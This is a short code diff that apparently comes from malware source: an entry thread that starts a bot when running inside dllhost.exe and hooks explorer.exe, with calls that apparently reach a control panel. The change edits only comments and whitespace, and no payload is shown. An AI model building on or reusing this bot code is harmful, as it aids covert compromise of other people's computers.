@@ -43,11 +43,10 @@ static DWORD WINAPI EntryThread(LPVOID lpParam)
    if(Funcs::pLstrcmpiA(exeName, Strs::dllhostExe) == 0)          // if exeName == dllhost.exe
    {
 #if !_WIN64
-      InitPanelRequest();
-      InitWow64ext();
+      InitPanelRequest();									      
+      InitWow64ext();											  // sets current process' heap handle to g_heap
       StartBot();
 #endif
-      // if compiled as 32 
    }
    else if(Funcs::pLstrcmpiA(exeName, Strs::explorerExe) == 0)    // if ... == explorer.exe
       HookExplorer();
